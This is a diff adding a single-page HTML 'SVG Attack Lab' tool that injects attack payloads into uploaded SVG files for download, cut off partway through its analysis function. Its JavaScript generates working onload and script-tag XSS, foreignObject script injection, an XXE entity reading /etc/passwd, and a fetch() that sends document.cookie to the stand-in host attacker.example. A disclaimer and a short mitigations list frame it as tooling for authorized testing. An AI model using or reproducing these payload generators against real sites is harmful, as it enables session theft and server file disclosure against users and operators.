@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SVG Attack Lab</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;600;700;800&display=swap');
+
+  :root {
+    --bg: #0d0f14;
+    --bg2: #141720;
+    --bg3: #1a1e2e;
+    --card: #1e2236;
+    --border: #2a3050;
+    --accent: #e84545;
+    --accent2: #ff6b35;
+    --green: #39d98a;
+    --blue: #4f8ef7;
+    --yellow: #f5c842;
+    --text: #e8eaf2;
+    --muted: #7a82a0;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+
+  [data-theme="light"] {
+    --bg: #f0f2f8;
+    --bg2: #e4e8f5;
+    --bg3: #dde3f0;
+    --card: #ffffff;
+    --border: #c5cee0;
+    --text: #1a1e2e;
+    --muted: #5a6380;
+    --accent: #d63030;
+    --green: #1a9e5a;
+    --blue: #2060d0;
+    --yellow: #c8960a;
+  }
+
+  [data-theme="eye"] {
+    --bg: #1e1a0e;
+    --bg2: #261f0e;
+    --bg3: #2e2610;
+    --card: #322810;
+    --border: #4a3c14;
+    --text: #f5dfa0;
+    --muted: #a08c50;
+    --accent: #e8a020;
+    --green: #80c040;
+    --blue: #60a0e0;
+    --yellow: #f0c840;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    transition: background .3s, color .3s;
+  }
+
+  /* ── NAV ── */
+  nav {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 32px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 20px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+  }
+
+  .logo-icon {
+    width: 34px;
+    height: 34px;
+    background: var(--accent);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+  }
+
+  .logo span { color: var(--accent); }
+
+  .nav-controls { display: flex; align-items: center; gap: 8px; }
+
+  .theme-btn {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 6px 12px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-family: var(--sans);
+    font-size: 12px;
+    transition: all .2s;
+  }
+
+  .theme-btn:hover, .theme-btn.active {
+    background: var(--accent);
+    color: #fff;
+    border-color: var(--accent);
+  }
+
+  /* ── DISCLAIMER ── */
+  .disclaimer {
+    background: linear-gradient(90deg, #1a0808, #1e1010, #1a0808);
+    border: 1px solid #5a2020;
+    border-left: 3px solid var(--accent);
+    margin: 24px 32px;
+    padding: 16px 20px;
+    border-radius: 8px;
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+  }
+
+  .disclaimer-icon { font-size: 22px; flex-shrink: 0; margin-top: 2px; }
+
+  .disclaimer-text { font-size: 13px; line-height: 1.7; color: var(--text); font-family: var(--mono); }
+
+  .disclaimer-text strong { color: var(--accent); }
+
+  [data-theme="light"] .disclaimer { background: #fff0f0; border-color: #f0c0c0; }
+  [data-theme="eye"] .disclaimer { background: #2a1e08; border-color: #6a4a10; }
+
+  /* ── MAIN ── */
+  .container { padding: 0 32px 48px; max-width: 1400px; margin: 0 auto; }
+
+  .section-title {
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 14px;
+  }
+
+  /* ── TECHNIQUES GRID ── */
+  .techniques-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 12px;
+    margin-bottom: 32px;
+  }
+
+  .tech-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+    cursor: pointer;
+    transition: all .2s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .tech-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+    background: var(--muted);
+    transition: background .2s;
+  }
+
+  .tech-card:hover { border-color: var(--accent); transform: translateY(-1px); }
+  .tech-card:hover::before { background: var(--accent); }
+
+  .tech-card.selected {
+    border-color: var(--accent);
+    background: var(--bg3);
+  }
+
+  .tech-card.selected::before { background: var(--accent); }
+
+  .tech-badge {
+    display: inline-block;
+    font-size: 10px;
+    font-family: var(--mono);
+    padding: 2px 8px;
+    border-radius: 4px;
+    margin-bottom: 8px;
+    font-weight: 600;
+  }
+
+  .badge-xss    { background: #3a1a1a; color: var(--accent); border: 1px solid #5a2020; }
+  .badge-exfil  { background: #1a2e3a; color: var(--blue);   border: 1px solid #203a50; }
+  .badge-dom    { background: #1a3a2e; color: var(--green);  border: 1px solid #204a36; }
+  .badge-xxe    { background: #2e2a1a; color: var(--yellow); border: 1px solid #4a3c14; }
+  .badge-csrf   { background: #2a1a3a; color: #c080ff;       border: 1px solid #402060; }
+
+  [data-theme="light"] .badge-xss    { background: #ffe5e5; color: #c02020; }
+  [data-theme="light"] .badge-exfil  { background: #e5f0ff; color: #1040a0; }
+  [data-theme="light"] .badge-dom    { background: #e5fff0; color: #106030; }
+  [data-theme="light"] .badge-xxe    { background: #fff8e5; color: #806010; }
+  [data-theme="light"] .badge-csrf   { background: #f5e5ff; color: #601080; }
+
+  [data-theme="eye"] .badge-xss   { background: #2a1a00; color: #e8a020; border-color: #5a3a10; }
+  [data-theme="eye"] .badge-exfil { background: #1a2a0a; color: #80c040; border-color: #304a14; }
+  [data-theme="eye"] .badge-dom   { background: #0a2a20; color: #60d0a0; border-color: #104a30; }
+  [data-theme="eye"] .badge-xxe   { background: #2a2000; color: #f0c840; border-color: #4a3c10; }
+  [data-theme="eye"] .badge-csrf  { background: #201a30; color: #c0a0f0; border-color: #3a2850; }
+
+  .tech-name {
+    font-size: 14px;
+    font-weight: 700;
+    margin-bottom: 6px;
+    color: var(--text);
+  }
+
+  .tech-desc {
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.6;
+    font-family: var(--mono);
+  }
+
+  .tech-severity {
+    display: flex;
+    gap: 3px;
+    margin-top: 10px;
+  }
+
+  .sev-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--border);
+  }
+
+  .sev-dot.lit { background: var(--accent); }
+  .sev-dot.med { background: var(--yellow); }
+
+  /* ── WORKSPACE ── */
+  .workspace {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+
+  @media (max-width: 900px) {
+    .workspace { grid-template-columns: 1fr; }
+  }
+
+  .panel {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+  }
+
+  .panel-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 16px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .panel-title {
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    color: var(--muted);
+    font-family: var(--mono);
+  }
+
+  .panel-body { padding: 16px; }
+
+  textarea, input[type="text"] {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 12px;
+    resize: vertical;
+    transition: border-color .2s;
+    outline: none;
+  }
+
+  textarea:focus, input[type="text"]:focus { border-color: var(--accent); }
+
+  .svg-textarea { min-height: 260px; }
+
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    padding: 9px 18px;
+    border-radius: 7px;
+    font-family: var(--sans);
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    border: none;
+    transition: all .2s;
+  }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #fff;
+  }
+
+  .btn-primary:hover { filter: brightness(1.15); transform: translateY(-1px); }
+
+  .btn-secondary {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text);
+  }
+
+  .btn-secondary:hover { border-color: var(--accent); color: var(--accent); }
+
+  .btn-green {
+    background: #1a4a2e;
+    border: 1px solid var(--green);
+    color: var(--green);
+  }
+
+  [data-theme="light"] .btn-green { background: #e5fff0; }
+
+  .btn-green:hover { background: var(--green); color: #fff; }
+
+  .btn-row {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-top: 12px;
+  }
+
+  /* Upload area */
+  .upload-area {
+    border: 2px dashed var(--border);
+    border-radius: 8px;
+    padding: 28px;
+    text-align: center;
+    cursor: pointer;
+    transition: all .2s;
+    position: relative;
+  }
+
+  .upload-area:hover, .upload-area.drag-over {
+    border-color: var(--accent);
+    background: var(--bg3);
+  }
+
+  .upload-area input { position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%; }
+
+  .upload-icon { font-size: 28px; margin-bottom: 8px; }
+
+  .upload-text { font-size: 13px; color: var(--muted); font-family: var(--mono); }
+
+  /* Output panel */
+  .output-box {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px;
+    min-height: 200px;
+    font-family: var(--mono);
+    font-size: 11.5px;
+    line-height: 1.7;
+    white-space: pre-wrap;
+    word-break: break-all;
+    color: var(--text);
+    max-height: 340px;
+    overflow-y: auto;
+  }
+
+  /* Syntax highlight colors */
+  .tok-tag  { color: var(--accent); }
+  .tok-attr { color: var(--blue); }
+  .tok-val  { color: var(--green); }
+  .tok-comment { color: var(--muted); }
+
+  /* Preview iframe */
+  .preview-frame {
+    width: 100%;
+    height: 260px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    background: #fff;
+  }
+
+  /* Technique detail box */
+  .tech-detail {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin-bottom: 14px;
+    display: none;
+  }
+
+  .tech-detail.visible { display: block; }
+
+  .detail-title { font-size: 13px; font-weight: 700; margin-bottom: 6px; color: var(--accent); }
+  .detail-text  { font-size: 12px; color: var(--muted); line-height: 1.7; font-family: var(--mono); }
+
+  /* Status bar */
+  .status-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 16px;
+    background: var(--bg3);
+    border-top: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  .status-dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--muted);
+  }
+
+  .status-dot.ready { background: var(--green); }
+  .status-dot.warn  { background: var(--yellow); }
+
+  /* Payload target input */
+  .param-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 8px;
+  }
+
+  .param-label { font-size: 11px; color: var(--muted); font-family: var(--mono); min-width: 80px; }
+
+  input[type="text"] { padding: 7px 10px; }
+
+  /* Footer */
+  footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 12px;
+    color: var(--muted);
+    border-top: 1px solid var(--border);
+    font-family: var(--mono);
+    margin-top: 20px;
+  }
+
+  footer span { color: var(--accent); }
+
+  /* Tab row */
+  .tab-row { display: flex; gap: 0; border-bottom: 1px solid var(--border); }
+
+  .tab {
+    padding: 9px 16px;
+    font-size: 12px;
+    font-family: var(--mono);
+    cursor: pointer;
+    color: var(--muted);
+    border-bottom: 2px solid transparent;
+    margin-bottom: -1px;
+    transition: all .2s;
+  }
+
+  .tab.active { color: var(--accent); border-color: var(--accent); }
+  .tab:hover { color: var(--text); }
+
+  .tab-content { display: none; padding: 14px 16px; }
+  .tab-content.active { display: block; }
+
+  .highlight { color: var(--accent); font-weight: 600; }
+
+  .no-select-msg {
+    text-align: center;
+    padding: 40px 20px;
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: 13px;
+  }
+
+  .no-select-msg .big { font-size: 32px; margin-bottom: 10px; }
+</style>
+</head>
+<body data-theme="dark">
+
+<!-- NAV -->
+<nav>
+  <div class="logo">
+    <div class="logo-icon">⚡</div>
+    SVG <span>Attack</span> Lab
+  </div>
+  <div class="nav-controls">
+    <button class="theme-btn active" onclick="setTheme('dark')">Dark</button>
+    <button class="theme-btn" onclick="setTheme('light')">Light</button>
+    <button class="theme-btn" onclick="setTheme('eye')">Eye-Save</button>
+  </div>
+</nav>
+
+<!-- DISCLAIMER -->
+<div class="disclaimer">
+  <div class="disclaimer-icon">⚠️</div>
+  <div class="disclaimer-text">
+    <strong>ETHICAL USE DISCLAIMER — READ BEFORE PROCEEDING</strong><br>
+    This tool is designed exclusively for <strong>authorized security research, CTF competitions, bug bounty programs, and controlled lab environments</strong>.
+    All payloads generated here must only be tested on systems you own or have explicit written permission to test.
+    Unauthorized use against production systems is <strong>illegal and unethical</strong>.
+    The authors accept no liability for misuse. By using this tool, you agree to comply with all applicable laws and responsible disclosure guidelines.
+  </div>
+</div>
+
+<div class="container">
+
+  <!-- TECHNIQUES -->
+  <div class="section-title">01 — Select Attack Technique</div>
+
+  <div class="techniques-grid">
+
+    <div class="tech-card" onclick="selectTech('xss_onload')" id="card-xss_onload">
+      <div class="tech-badge badge-xss">XSS</div>
+      <div class="tech-name">Inline Script — onload XSS</div>
+      <div class="tech-desc">Injects JavaScript via SVG onload event handler. Fires when SVG is rendered inline in HTML.</div>
+      <div class="tech-severity">
+        <div class="sev-dot lit"></div><div class="sev-dot lit"></div><div class="sev-dot lit"></div>
+        <div class="sev-dot"></div><div class="sev-dot"></div>
+        <span style="font-size:10px;color:var(--muted);margin-left:6px;font-family:var(--mono)">Critical</span>
+      </div>
+    </div>
+
+    <div class="tech-card" onclick="selectTech('xss_script')" id="card-xss_script">
+      <div class="tech-badge badge-xss">XSS</div>
+      <div class="tech-name">Script Tag XSS</div>
+      <div class="tech-desc">Embeds a &lt;script&gt; block directly inside SVG. Works when SVG is served as text/html or embedded inline.</div>
+      <div class="tech-severity">
+        <div class="sev-dot lit"></div><div class="sev-dot lit"></div><div class="sev-dot lit"></div>
+        <div class="sev-dot"></div><div class="sev-dot"></div>
+        <span style="font-size:10px;color:var(--muted);margin-left:6px;font-family:var(--mono)">Critical</span>
+      </div>
+    </div>
+
+    <div class="tech-card" onclick="selectTech('exfil_image')" id="card-exfil_image">
+      <div class="tech-badge badge-exfil">EXFIL</div>
+      <div class="tech-name">Image-based Data Exfiltration</div>
+      <div class="tech-desc">Uses &lt;image href&gt; to beacon data to an attacker server by encoding it in query parameters.</div>
+      <div class="tech-severity">
+        <div class="sev-dot med"></div><div class="sev-dot med"></div><div class="sev-dot med"></div>
+        <div class="sev-dot"></div><div class="sev-dot"></div>
+        <span style="font-size:10px;color:var(--muted);margin-left:6px;font-family:var(--mono)">High</span>
+      </div>
+    </div>
+
+    <div class="tech-card" onclick="selectTech('foreign_object')" id="card-foreign_object">
+      <div class="tech-badge badge-dom">DOM XSS</div>
+      <div class="tech-name">foreignObject DOM Injection</div>
+      <div class="tech-desc">Embeds HTML namespace inside SVG via &lt;foreignObject&gt;. Bypasses SVG-only sanitizers.</div>
+      <div class="tech-severity">
+        <div class="sev-dot lit"></div><div class="sev-dot lit"></div><div class="sev-dot lit"></div>
+        <div class="sev-dot"></div><div class="sev-dot"></div>
+        <span style="font-size:10px;color:var(--muted);margin-left:6px;font-family:var(--mono)">Critical</span>
+      </div>
+    </div>
+
+    <div class="tech-card" onclick="selectTech('xxe')" id="card-xxe">
+      <div class="tech-badge badge-xxe">XXE</div>
+      <div class="tech-name">XML External Entity (XXE)</div>
+      <div class="tech-desc">DOCTYPE with external entity reads local files server-side. Requires vulnerable XML parser.</div>
+      <div class="tech-severity">
+        <div class="sev-dot lit"></div><div class="sev-dot lit"></div><div class="sev-dot lit"></div>
+        <div class="sev-dot lit"></div><div class="sev-dot"></div>
+        <span style="font-size:10px;color:var(--muted);margin-left:6px;font-family:var(--mono)">Critical+</span>
+      </div>
+    </div>
+
+    <div class="tech-card" onclick="selectTech('cookie_steal')" id="card-cookie_steal">
+      <div class="tech-badge badge-csrf">COOKIE THEFT</div>
+      <div class="tech-name">Cookie Exfiltration via Fetch</div>
+      <div class="tech-desc">Uses fetch() inside SVG to transmit document.cookie to a controlled endpoint.</div>
+      <div class="tech-severity">
+        <div class="sev-dot lit"></div><div class="sev-dot lit"></div><div class="sev-dot lit"></div>
+        <div class="sev-dot lit"></div><div class="sev-dot"></div>
+        <span style="font-size:10px;color:var(--muted);margin-left:6px;font-family:var(--mono)">Critical+</span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- TECHNIQUE DETAIL -->
+  <div class="tech-detail" id="tech-detail">
+    <div class="detail-title" id="detail-title"></div>
+    <div class="detail-text" id="detail-text"></div>
+  </div>
+
+  <!-- WORKSPACE -->
+  <div class="section-title">02 — Configure &amp; Inject</div>
+
+  <div id="no-select-msg" class="no-select-msg">
+    <div class="big">☝️</div>
+    Select a technique above to begin
+  </div>
+
+  <div id="workspace" class="workspace" style="display:none">
+
+    <!-- LEFT: Input -->
+    <div class="panel">
+      <div class="tab-row">
+        <div class="tab active" onclick="switchTab('upload-tab', this)">Upload SVG</div>
+        <div class="tab" onclick="switchTab('manual-tab', this)">Manual Edit</div>
+        <div class="tab" onclick="switchTab('params-tab', this)">Parameters</div>
+      </div>
+
+      <div class="tab-content active" id="upload-tab">
+        <div class="upload-area" id="upload-area">
+          <input type="file" accept=".svg,image/svg+xml" onchange="handleFileUpload(event)">
+          <div class="upload-icon">📁</div>
+          <div class="upload-text">Drop an SVG file here or click to browse<br><span style="font-size:10px;opacity:.6">Accepted: .svg files only</span></div>
+        </div>
+        <div style="margin-top:12px;font-size:11px;color:var(--muted);font-family:var(--mono)">— or use a template —</div>
+        <div class="btn-row">
+          <button class="btn btn-secondary" onclick="loadTemplate('basic')">Basic SVG</button>
+          <button class="btn btn-secondary" onclick="loadTemplate('circle')">Circle Shape</button>
+          <button class="btn btn-secondary" onclick="loadTemplate('text')">Text SVG</button>
+        </div>
+      </div>
+
+      <div class="tab-content" id="manual-tab">
+        <textarea class="svg-textarea" id="svg-input" placeholder="Paste your SVG source here..."></textarea>
+      </div>
+
+      <div class="tab-content" id="params-tab">
+        <div class="param-row">
+          <span class="param-label">Callback URL</span>
+          <input type="text" id="param-url" value="https://attacker.example/collect" placeholder="https://your-server.com/collect">
+        </div>
+        <div class="param-row">
+          <span class="param-label">File Path</span>
+          <input type="text" id="param-file" value="/etc/passwd" placeholder="/etc/passwd">
+        </div>
+        <div class="param-row">
+          <span class="param-label">Payload JS</span>
+          <input type="text" id="param-js" value="alert('XSS')" placeholder="Custom JS payload">
+        </div>
+        <div style="margin-top:8px;font-size:11px;color:var(--muted);font-family:var(--mono)">These values are substituted into the generated payload.</div>
+      </div>
+
+      <div class="btn-row" style="padding:0 16px 14px">
+        <button class="btn btn-primary" onclick="injectPayload()">⚡ Inject Payload</button>
+        <button class="btn btn-secondary" onclick="clearAll()">Clear</button>
+      </div>
+
+      <div class="status-bar">
+        <div class="status-dot" id="status-dot"></div>
+        <span id="status-text">No technique selected</span>
+      </div>
+    </div>
+
+    <!-- RIGHT: Output -->
+    <div class="panel">
+      <div class="tab-row">
+        <div class="tab active" onclick="switchTab('output-code-tab', this)">Output SVG</div>
+        <div class="tab" onclick="switchTab('preview-tab', this)">Preview</div>
+        <div class="tab" onclick="switchTab('analysis-tab', this)">Analysis</div>
+      </div>
+
+      <div class="tab-content active" id="output-code-tab">
+        <div class="output-box" id="output-box">
+          <span style="color:var(--muted)">// Injected SVG will appear here...</span>
+        </div>
+        <div class="btn-row" style="margin-top:10px">
+          <button class="btn btn-green" onclick="downloadOutput()">⬇ Download SVG</button>
+          <button class="btn btn-secondary" onclick="copyOutput()">Copy</button>
+        </div>
+      </div>
+
+      <div class="tab-content" id="preview-tab">
+        <div style="font-size:11px;color:var(--muted);font-family:var(--mono);margin-bottom:8px">
+          ⚠ Preview renders SVG in a sandboxed iframe. Scripts won't execute here.
+        </div>
+        <iframe class="preview-frame" id="preview-frame" sandbox="allow-same-origin"></iframe>
+      </div>
+
+      <div class="tab-content" id="analysis-tab">
+        <div id="analysis-box" style="font-size:12px;line-height:1.8;font-family:var(--mono);color:var(--text)">
+          <span style="color:var(--muted)">Run an injection first to see analysis...</span>
+        </div>
+      </div>
+
+      <div class="status-bar">
+        <div class="status-dot ready" id="output-status-dot"></div>
+        <span id="output-status-text">Ready</span>
+        &nbsp;|&nbsp;
+        <span id="output-size">0 bytes</span>
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<footer>
+  Made with ❤️ by <span>Aryan Giri</span> &nbsp;|&nbsp; SVG Attack Lab &nbsp;|&nbsp; For authorized security research only
+</footer>
+
+<script>
+// ─────────────────────────────────────────────
+//  TECHNIQUES DATABASE
+// ─────────────────────────────────────────────
+const TECHNIQUES = {
+  xss_onload: {
+    name: 'Inline onload XSS',
+    description: 'SVG supports event handler attributes like onload. When SVG is embedded inline in an HTML page (not via <img>), the onload attribute fires immediately, executing arbitrary JavaScript. This bypasses filters that only check for <script> tags.',
+    inject: (svg, p) => {
+      const safe = stripRootAttrs(svg, ['onload','onclick','onerror','onmouseover']);
+      return safe.replace(/(<svg[^>]*)>/, `$1 onload="${escAttr(p.js)}">`);
+    }
+  },
+  xss_script: {
+    name: 'Script Tag XSS',
+    description: 'SVG is XML-based and natively supports <script> elements. When served as text/html or embedded inline, browsers execute the script. Some WAFs only block event handlers, missing this vector. The CDATA wrapper helps bypass XML parser restrictions.',
+    inject: (svg, p) => {
+      const scriptTag = `\n  <script><![CDATA[\n    ${p.js};\n  ]]><\/script>`;
+      return svg.replace(/(<\/svg>)/, scriptTag + '\n$1');
+    }
+  },
+  exfil_image: {
+    name: 'Image-based Exfiltration',
+    description: 'SVG <image> elements load external URLs. By encoding sensitive data (URL, cookies via JS, etc.) as query parameters in the href, data is beaconed to an attacker-controlled server. Works even when scripts are blocked, as image loads bypass CSP image-src restrictions in some configs.',
+    inject: (svg, p) => {
+      const imgTag = `\n  <image href="${escAttr(p.url)}?loc="+encodeURIComponent(window.location)+"&ref="+encodeURIComponent(document.referrer)" width="1" height="1"/>`;
+      return svg.replace(/(<\/svg>)/, imgTag + '\n$1');
+    }
+  },
+  foreign_object: {
+    name: 'foreignObject DOM Injection',
+    description: '<foreignObject> allows embedding arbitrary HTML inside SVG. This is a common WAF bypass: the server-side sanitizer may strip <script> tags but allow <foreignObject>. The HTML inside it is interpreted in the HTML namespace, where event handlers and <script> tags execute normally.',
+    inject: (svg, p) => {
+      const fo = `\n  <foreignObject width="1" height="1">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>${p.js}<\/script>
+    </body>
+  </foreignObject>`;
+      return svg.replace(/(<\/svg>)/, fo + '\n$1');
+    }
+  },
+  xxe: {
+    name: 'XXE — Local File Read',
+    description: 'When an SVG is parsed server-side by an XML parser with external entity resolution enabled (Java SAXParser, Python lxml, libxml2 with NOENT), a DOCTYPE declaration can define an external entity pointing to a local file. The parser substitutes the entity with file contents, which may be reflected in the response or cause an error-based exfil.',
+    inject: (svg, p) => {
+      const xxeHeader = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file://${p.file}">
+]>`;
+      const result = xxeHeader + '\n' + svg.replace(/(<text[^>]*>)[^<]*(<\/text>)/, '$1&xxe;$2');
+      if (!/<text/.test(svg)) {
+        return xxeHeader + '\n' + svg.replace(/(<\/svg>)/, '\n  <text x="10" y="20">&xxe;</text>\n$1');
+      }
+      return result;
+    }
+  },
+  cookie_steal: {
+    name: 'Cookie Exfiltration via Fetch',
+    description: 'Combines XSS execution with credential theft. The onload handler fires fetch() to a controlled endpoint, passing document.cookie in the query string. This works in contexts where HttpOnly is NOT set. When combined with SVG-in-innerHTML injection, the same-origin policy is satisfied automatically.',
+    inject: (svg, p) => {
+      const payload = `fetch('${p.url}?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href))`;
+      const safe = stripRootAttrs(svg, ['onload','onclick','onerror']);
+      return safe.replace(/(<svg[^>]*)>/, `$1 onload="${escAttr(payload)}">`);
+    }
+  }
+};
+
+// ─────────────────────────────────────────────
+//  TEMPLATES
+// ─────────────────────────────────────────────
+const TEMPLATES = {
+  basic: `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
+  <rect width="200" height="100" fill="#eee"/>
+  <text x="100" y="55" text-anchor="middle" font-size="18">Hello SVG</text>
+</svg>`,
+  circle: `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <circle cx="100" cy="100" r="80" fill="#4f8ef7" stroke="#2060d0" stroke-width="3"/>
+  <text x="100" y="108" text-anchor="middle" fill="white" font-size="16">Safe Circle</text>
+</svg>`,
+  text: `<svg xmlns="http://www.w3.org/2000/svg" width="300" height="80">
+  <rect width="300" height="80" fill="#1e2236"/>
+  <text x="150" y="30" text-anchor="middle" fill="#e84545" font-size="14" font-weight="bold">Security Test</text>
+  <text x="150" y="56" text-anchor="middle" fill="#7a82a0" font-size="11">Controlled environment only</text>
+</svg>`
+};
+
+// ─────────────────────────────────────────────
+//  STATE
+// ─────────────────────────────────────────────
+let selectedTech = null;
+let currentSVG = '';
+let outputSVG = '';
+
+// ─────────────────────────────────────────────
+//  THEME
+// ─────────────────────────────────────────────
+function setTheme(t) {
+  document.body.setAttribute('data-theme', t);
+  document.querySelectorAll('.theme-btn').forEach(b => b.classList.remove('active'));
+  event.target.classList.add('active');
+}
+
+// ─────────────────────────────────────────────
+//  TECHNIQUE SELECTION
+// ─────────────────────────────────────────────
+function selectTech(key) {
+  selectedTech = key;
+  document.querySelectorAll('.tech-card').forEach(c => c.classList.remove('selected'));
+  document.getElementById('card-' + key).classList.add('selected');
+
+  const t = TECHNIQUES[key];
+  document.getElementById('detail-title').textContent = '→ ' + t.name;
+  document.getElementById('detail-text').textContent = t.description;
+  document.getElementById('tech-detail').classList.add('visible');
+
+  document.getElementById('no-select-msg').style.display = 'none';
+  document.getElementById('workspace').style.display = 'grid';
+
+  setStatus(true, 'Technique selected: ' + t.name);
+}
+
+// ─────────────────────────────────────────────
+//  FILE UPLOAD
+// ─────────────────────────────────────────────
+function handleFileUpload(e) {
+  const file = e.target.files[0];
+  if (!file) return;
+  if (!file.name.endsWith('.svg') && file.type !== 'image/svg+xml') {
+    alert('Please upload an SVG file.');
+    return;
+  }
+  const reader = new FileReader();
+  reader.onload = ev => {
+    currentSVG = ev.target.result;
+    document.getElementById('svg-input').value = currentSVG;
+    document.getElementById('upload-area').querySelector('.upload-text').innerHTML =
+      `✅ Loaded: <strong>${file.name}</strong> (${formatBytes(file.size)})`;
+    setStatus(true, 'SVG loaded: ' + file.name);
+  };
+  reader.readAsText(file);
+}
+
+function loadTemplate(name) {
+  currentSVG = TEMPLATES[name];
+  document.getElementById('svg-input').value = currentSVG;
+  setStatus(true, 'Template loaded: ' + name);
+  switchTabByName('manual-tab');
+}
+
+// ─────────────────────────────────────────────
+//  INJECTION
+// ─────────────────────────────────────────────
+function injectPayload() {
+  if (!selectedTech) { alert('Select a technique first.'); return; }
+
+  // Get SVG from textarea or current
+  const input = document.getElementById('svg-input').value.trim() || currentSVG;
+  if (!input) { alert('Load or paste an SVG first.'); return; }
+
+  const params = {
+    url: document.getElementById('param-url').value || 'https://attacker.example/collect',
+    file: document.getElementById('param-file').value || '/etc/passwd',
+    js: document.getElementById('param-js').value || "alert('XSS')"
+  };
+
+  try {
+    outputSVG = TECHNIQUES[selectedTech].inject(input, params);
+    renderOutput(outputSVG);
+    renderAnalysis(input, outputSVG);
+    renderPreview(outputSVG);
+    setStatus(true, 'Payload injected successfully');
+    document.getElementById('output-status-text').textContent = 'Payload injected';
+    document.getElementById('output-size').textContent = formatBytes(outputSVG.length);
+  } catch(err) {
+    setStatus(false, 'Injection error: ' + err.message);
+  }
+}
+
+// ─────────────────────────────────────────────
+//  RENDER OUTPUT (simple highlight)
+// ─────────────────────────────────────────────
+function renderOutput(svg) {
+  const box = document.getElementById('output-box');
+  box.innerHTML = syntaxHighlight(svg);
+}
+
+function syntaxHighlight(code) {
+  return code
+    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+    .replace(/(&lt;\/?[\w:]+)/g, '<span class="tok-tag">$1</span>')
+    .replace(/ ([\w:-]+)=/g, ' <span class="tok-attr">$1</span>=')
+    .replace(/&gt;/g, '<span class="tok-tag">&gt;</span>')
+    .replace(/(&lt;!--[\s\S]*?--&gt;)/g, '<span class="tok-comment">$1</span>');
+}
+
+// ─────────────────────────────────────────────
+//  ANALYSIS
+// ─────────────────────────────────────────────
+function renderAnalysis(original, injected) {
+  const box = document.getElementById('analysis-box');
+  const t = TECHNIQUES[selectedTech];
+  const vectors = detectVectors(injected);
+  const added = injected.length - original.length;
+
+  box.innerHTML = `
+<span style="color:var(--accent);font-weight:700">[ INJECTION ANALYSIS ]</span>
+
+<span style="color:var(--muted)">Technique  :</span> ${t.name}
+<span style="color:var(--muted)">Bytes added:</span> +${added} bytes
+<span style="color:var(--muted)">Total size :</span> ${formatBytes(injected.length)}
+
+<span style="color:var(--yellow);font-weight:700">[ DETECTED VECTORS ]</span>
+${vectors.map(v => `  • <span style="color:var(--green)">${v}</span>`).join('\n')}
+
+<span style="color:var(--blue);font-weight:700">[ MITIGATIONS ]</span>
+  • Use DOMPurify with SVG namespace support
+  • Enforce CSP: script-src 'none'; img-src 'self'
+  • Serve uploaded SVG as image/png after conversion
+  • Disable external entity resolution (XXE fix)
+  • Sandbox SVG in &lt;iframe sandbox&gt;
